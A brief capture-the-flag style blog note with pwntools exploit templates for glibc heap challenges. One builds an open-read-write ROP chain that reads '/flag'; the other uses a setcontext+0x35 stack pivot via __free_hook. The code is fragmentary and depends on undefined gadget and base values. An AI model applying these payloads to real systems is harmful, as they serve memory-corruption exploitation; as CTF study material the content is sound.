---
title: Setcontext
date: 2021-05-19 09:03:08
tags:
---
Passby ORW with Setcontext 
<!--more-->
# ORW PAYLOAD

```python
context.arch='amd64'#"i386"
# get gadgets & make payload
# len(payload)= 23*8+6
rax=base+gadget['rax']
rdi=base+gadget['rdi']
rsi=base+gadget['rsi']
rdx=base+gadget['rdx']
filename_addr=libc.sym['__free_hook']+0x200+23*8
buf=libc.sym['__free_hook']+0x100

payload  =  flat([rax,2,rdi,filename_addr,rsi,0,rdx,0,sys])
payload += flat([rax,0,rdi,3,rsi,buf,rdx,0x50,sys])
payload += flat([rax,1,rdi,1,sys])+'/flag\0'
```

# Setcontext + 0x35（RDI）

```python

context.arch='amd64'#"i386"
sys=libc.sym["getpid"]+5
leave=libc.sym['strfromf128']-0x51d

# RSP -> gadget of 'leave ret'
# Set __free_hook+8 ->leave is a good choice
rsp=libc.sym['__free_hook']+8
rdi=0
rsi=0x200+libc.sym['__free_hook']
rdx=0x200
rbp=rsi-8
rcx=sys
setcontext='\0'*0x68+flat([rdi,rsi,rbp,0,rdx,0,0,rsp,rcx])#len=22*8
######################Part2################################
rax=base+gadget['rax']
rdi=base+gadget['rdi']
rsi=base+gadget['rsi']
rdx=base+gadget['rdx']
filename_addr=libc.sym['__free_hook']+0x200+23*8
buf=libc.sym['__free_hook']+0x100

payload = flat([rax,2,rdi,filename_addr,rsi,0,rdx,0,sys])
payload += flat([rax,0,rdi,3,rsi,buf,rdx,0x50,sys])
payload += flat([rax,1,rdi,1,sys])+'/flag\0'
```